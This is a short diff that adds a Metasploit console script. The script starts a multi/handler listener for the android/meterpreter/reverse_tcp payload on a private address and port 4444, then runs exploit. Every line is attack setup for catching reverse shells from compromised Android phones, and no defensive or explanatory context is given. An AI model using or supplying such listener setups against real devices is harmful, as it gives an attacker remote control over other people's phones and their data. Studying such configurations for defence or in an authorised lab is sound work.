@@ -1,0 +1,6 @@
+msf console
+use exploit/multi/handler
+set payload android/meterpreter/reverse_tcp
+set lhost 192.168.43.166
+set lport 4444
+exploit
